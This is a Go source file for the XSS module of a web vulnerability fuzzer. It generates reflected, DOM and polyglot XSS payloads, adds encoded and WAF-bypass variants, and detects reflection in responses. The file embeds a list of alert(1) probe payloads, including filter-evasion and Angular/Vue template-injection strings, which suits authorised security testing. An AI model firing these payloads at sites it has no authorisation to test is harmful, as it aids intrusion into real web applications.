package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type XSSModule struct{}

func (m *XSSModule) Name() string        { return "xss" }
func (m *XSSModule) Description() string { return "Cross-Site Scripting (reflected, DOM, polyglot)" }

func (m *XSSModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := xssPayloads()
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{
				Value:   p.value,
				Point:   point,
				Module:  "xss",
				Variant: p.variant,
			})
			if mode == "smart" || mode == "mutate" {
				for _, encoded := range mutator.EncodeVariants(p.value) {
					if encoded != p.value {
						payloads = append(payloads, mutator.Payload{Value: encoded, Point: point, Module: "xss", Variant: p.variant + "+encoded"})
					}
				}
			}
		}
	}
	return payloads
}

func (m *XSSModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Reflection detection - payload aparece in response
	if strings.Contains(respBody, payload.Value) {
		sev := "high"
		conf := "high"
		title := "XSS - Reflected (payload refletido sem sanitização)"
		if strings.Contains(payload.Value, "<script") || strings.Contains(payload.Value, "onerror") ||
			strings.Contains(payload.Value, "onload") || strings.Contains(payload.Value, "javascript:") {
			sev = "high"
			conf = "confirmed"
			title = "XSS - Reflected (tag/event handler refletido)"
		}
		return &Finding{
			Module:      "xss",
			Severity:    sev,
			Confidence:  conf,
			Title:       title,
			Description: "XSS payload reflected in response without proper sanitization",
			Payload:     payload.Value,
			Point:       payload.Point,
			Evidence:    "Payload found no body da resposta",
			OWASP:       "A03:2021 Injection",
			CWE:         "CWE-79",
		}
	}

	// Partial reflection (caracteres perigosos refletidos)
	dangerousChars := []string{"<", ">", "\"", "'", "on"}
	for _, c := range dangerousChars {
		if strings.Contains(payload.Value, c) && strings.Contains(respBody, c) && !strings.Contains(baseBody, c) {
			return &Finding{
				Module:      "xss",
				Severity:    "medium",
				Confidence:  "medium",
				Title:       "XSS - Caracteres perigosos refletidos",
				Description: "HTML/JS characters reflected without encoding",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    "Character '" + c + "' reflected in body",
				OWASP:       "A03:2021 Injection",
				CWE:         "CWE-79",
			}
		}
	}

	return nil
}

type xssPayload struct {
	value   string
	variant string
}

func xssPayloads() []xssPayload {
	return []xssPayload{
		// Basic
		{`<script>alert(1)</script>`, "basic"},
		{`<img src=x onerror=alert(1)>`, "event-handler"},
		{`<svg onload=alert(1)>`, "svg"},
		{`<body onload=alert(1)>`, "body"},
		{`<iframe src="javascript:alert(1)">`, "iframe"},
		{`<input onfocus=alert(1) autofocus>`, "autofocus"},
		{`<details open ontoggle=alert(1)>`, "details"},
		{`<marquee onstart=alert(1)>`, "marquee"},
		{`<video><source onerror=alert(1)>`, "video"},
		{`<audio src=x onerror=alert(1)>`, "audio"},

		// Attribute escape
		{`" onmouseover="alert(1)`, "attr-escape"},
		{`' onmouseover='alert(1)`, "attr-escape-sq"},
		{`"><script>alert(1)</script>`, "attr-break"},
		{`'><script>alert(1)</script>`, "attr-break-sq"},
		{`" onfocus="alert(1)" autofocus="`, "attr-inject"},

		// JavaScript context
		{`';alert(1)//`, "js-context"},
		{`";alert(1)//`, "js-context-dq"},
		{`</script><script>alert(1)</script>`, "script-break"},
		{`\";alert(1)//`, "js-escape"},
		{`'-alert(1)-'`, "js-expr"},

		// Template literals
		{"${alert(1)}", "template-literal"},
		{"`${alert(1)}`", "template-literal-bt"},

		// DOM-based vectors
		{`javascript:alert(1)`, "dom-href"},
		{`data:text/html,<script>alert(1)</script>`, "data-uri"},
		{`#<script>alert(1)</script>`, "fragment"},

		// Polyglots
		{`jaVasCript:/*-/*` + "`" + `/*\` + "`" + `/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`, "polyglot"},
		{`'-alert(1)-'`, "polyglot-short"},
		{`'";!--"<XSS>=&{()}`, "probe"},

		// WAF bypass
		{`<scr<script>ipt>alert(1)</scr</script>ipt>`, "waf-nested"},
		{`<ScRiPt>alert(1)</ScRiPt>`, "waf-case"},
		{`<script/x>alert(1)</script>`, "waf-slash"},
		{`<script%20>alert(1)</script>`, "waf-space"},
		{`<img src=x onerror=alert&#40;1&#41;>`, "waf-entities"},
		{`<svg/onload=alert(1)>`, "waf-nospace"},
		{`<img src=x onerror=\u0061lert(1)>`, "waf-unicode"},
		{`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, "waf-decimal"},
		{`\x3cscript\x3ealert(1)\x3c/script\x3e`, "waf-hex"},
		{`<math><mi><!--</mi><script>alert(1)</script>`, "mutation-xss"},

		// Framework-specific
		{`{{constructor.constructor('alert(1)')()}}`, "angular"},
		{`{{$on.constructor('alert(1)')()}}`, "angular2"},
		{`<div v-html="'<img src=x onerror=alert(1)>'"></div>`, "vue"},
		{`{alert(1)}`, "svelte"},
	}
}
